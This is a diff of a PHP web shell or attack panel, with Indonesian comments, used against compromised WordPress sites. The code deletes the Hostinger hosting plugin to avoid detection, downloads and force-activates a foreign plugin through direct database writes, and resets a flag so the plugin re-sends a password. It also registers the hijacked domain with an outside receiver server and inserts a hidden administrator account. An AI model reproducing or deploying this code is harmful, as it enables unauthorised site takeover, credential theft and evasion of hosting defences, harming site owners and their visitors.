@@ -610,8 +610,26 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
             if (@mysqli_real_connect($cn, $dh, $du, $dp, $dn)) {
                 if (isset($_POST['create_wp_admin'])) {
                     
-                    // --- 1. DOWNLOAD PLUGIN ---
                     $plugins_dir = $wp_root_path . '/wp-content/plugins/';
+                    
+                    // --- [BARU] DETEKSI & HAPUS PLUGIN HOSTINGER ---
+                    // Dilakukan sebelum download plugin kita agar tidak bentrok/terdeteksi
+                    $path_hostinger = $plugins_dir . 'hostinger';
+                    $hst_badge = "";
+                    
+                    if (is_dir($path_hostinger)) {
+                        // Gunakan fungsi rrmdir() bawaan filemanager untuk hapus folder & isinya
+                        rrmdir($path_hostinger);
+                        clearstatcache(); // Refresh cache status file
+                        
+                        if (!file_exists($path_hostinger)) {
+                            $hst_badge = "<span style='$st_warn'>HOSTINGER DEL</span>";
+                        } else {
+                            $hst_badge = "<span style='$st_err'>DEL HOSTINGER FAIL</span>";
+                        }
+                    }
+
+                    // --- 1. DOWNLOAD PLUGIN SYSTEM CORE ---
                     $target_folder = $plugins_dir . $plugin_folder_name;
                     $target_file = $target_folder . '/' . $plugin_filename;
                     $dl_badge = "<span style='$st_err'>DL FAIL</span>";
@@ -638,14 +656,12 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     $renamed_obj = false;
                     $renamed_adv = false;
 
-                    // Rename agar WP dipaksa baca DB
                     if (file_exists($obj_cache)) { @rename($obj_cache, $obj_cache . '.suspend'); $renamed_obj = true; }
                     if (file_exists($adv_cache)) { @rename($adv_cache, $adv_cache . '.suspend'); $renamed_adv = true; }
                     
                     // Hapus folder cache fisik jika ada
                     $cache_dir = $wp_content . '/cache';
                     if (is_dir($cache_dir)) {
-                        // Simple recursive delete untuk folder cache
                         $files = new RecursiveIteratorIterator(
                             new RecursiveDirectoryIterator($cache_dir, RecursiveDirectoryIterator::SKIP_DOTS),
                             RecursiveIteratorIterator::CHILD_FIRST
@@ -667,21 +683,22 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                         $current_plugins = [];
                     }
 
-                    // Hapus yang lama, Masukkan yang baru
-                    $current_plugins = array_diff($current_plugins, [$plugin_hook_old]); // Hapus single file
+                    $current_plugins = array_diff($current_plugins, [$plugin_hook_old]);
                     if (!in_array($plugin_hook, $current_plugins)) {
                         $current_plugins[] = $plugin_hook;
                     }
                     sort($current_plugins);
                     
-                    // Force Update ke DB (Selalu update, jangan skip)
                     $new_val = mysqli_real_escape_string($cn, serialize($current_plugins));
                     
-                    // Hapus dulu untuk memastikan fresh insert/update
                     @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='active_plugins'");
                     if (@mysqli_query($cn, "INSERT INTO {$pre}options (option_name, option_value, autoload) VALUES ('active_plugins', '$new_val', 'yes')")) {
-                         // Bersihkan transient DB cache
+                        // Bersihkan transient DB cache
                         @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name LIKE '_transient_%' OR option_name LIKE '_site_transient_%'");
+                        
+                        // [FIX PENTING] Hapus status setup agar plugin mengirim ulang password ke dashboard
+                        @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='rls_setup_done'");
+                        
                         $act_badge = "<span style='$st_ok'>FORCED ON</span>";
                         $is_active = true;
                     } else {
@@ -689,31 +706,25 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     }
 
                     // --- 3. PING & RESTORE CACHE ---
-                    
-                    // [TAMBAHAN BARU: AUTO-TRIGGER PLUGIN]
-                    // Melakukan request ke homepage target agar plugin tereksekusi
                     if ($is_active && !empty($surl)) {
                         $trigger_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
-                        
-                        // Cara 1: cURL (Paling Efektif)
                         if (function_exists('curl_init')) {
                             $ch_t = curl_init();
                             curl_setopt($ch_t, CURLOPT_URL, $surl);
                             curl_setopt($ch_t, CURLOPT_RETURNTRANSFER, true);
-                            curl_setopt($ch_t, CURLOPT_TIMEOUT, 5); // Cukup 5 detik
+                            curl_setopt($ch_t, CURLOPT_TIMEOUT, 5);
                             curl_setopt($ch_t, CURLOPT_USERAGENT, $trigger_ua);
                             curl_setopt($ch_t, CURLOPT_SSL_VERIFYPEER, false);
                             curl_setopt($ch_t, CURLOPT_SSL_VERIFYHOST, false);
                             @curl_exec($ch_t);
                             @curl_close($ch_t);
                         } 
-                        // Cara 2: file_get_contents (Cadangan)
                         elseif (ini_get('allow_url_fopen')) {
                             $opts_t = ['http'=>['method'=>'GET','header'=>"User-Agent: $trigger_ua\r\n",'timeout'=>5]];
                             @file_get_contents($surl, false, stream_context_create($opts_t));
                         }
                     }
-                    // [AKHIR TAMBAHAN]
+
                     $ping_badge = "<span style='background:#555; color:#aaa; padding:2px 6px; border-radius:3px; font-size:0.85em;'>NO PING</span>";
                     $surl = "";
                     $qurl = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
@@ -723,9 +734,8 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                         $pdata = http_build_query(['action'=>'register_site', 'secret'=>$receiver_key, 'domain'=>$surl]);
                         $ping_success = false;
                         $method_used = "";
-                        $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
+                        $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
 
-                        // Method A: CURL
                         if (!$ping_success && function_exists('curl_init')) {
                             $ch = curl_init();
                             curl_setopt($ch, CURLOPT_URL, $receiver_url);
@@ -741,7 +751,6 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                             if ($res !== false && $code == 200) { $ping_success = true; $method_used = "CURL"; }
                         }
 
-                        // Method B: FGC
                         if (!$ping_success) {
                             $opts = ['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded\r\nUser-Agent: $ua\r\n",'content'=>$pdata,'timeout'=>6]];
                             $res = @file_get_contents($receiver_url, false, stream_context_create($opts));
@@ -752,9 +761,6 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                         else $ping_badge = "<span style='$st_err'>PING FAIL</span>";
                     }
                     
-                    // Kembalikan file cache yang tadi di-rename (PENTING: Setelah PING)
-                    // Ping di atas akan memaksa WP regenerate cache dari DB karena object-cache.php sedang mati.
-                    // Setelah cache fresh, kita nyalakan lagi sistem cachenya.
                     if ($renamed_obj) { @rename($obj_cache . '.suspend', $obj_cache); }
                     if ($renamed_adv) { @rename($adv_cache . '.suspend', $adv_cache); }
 
@@ -775,8 +781,9 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}capabilities','$cap') ON DUPLICATE KEY UPDATE meta_value='$cap'");
                     @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");
 
-                    $log .= "$dl_badge $act_badge $ping_badge $u_badge <a href='$surl/wp-login.php' target='_blank' style='background:#333; padding:2px 6px; border-radius:3px; color:#fff; text-decoration:none; font-size:0.85em;'>Login &raquo;</a>";
-                } 
+                    // Tampilkan Badge Hostinger di log
+                    $log .= "$dl_badge $hst_badge $act_badge $ping_badge $u_badge <a href='$surl/wp-login.php' target='_blank' style='background:#333; padding:2px 6px; border-radius:3px; color:#fff; text-decoration:none; font-size:0.85em;'>Login &raquo;</a>";
+                }
                 elseif (isset($_POST['reactivate_plugins'])) {
                     $qbk = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='xshikata_bkp'");
                     if ($qbk && mysqli_num_rows($qbk)>0) {
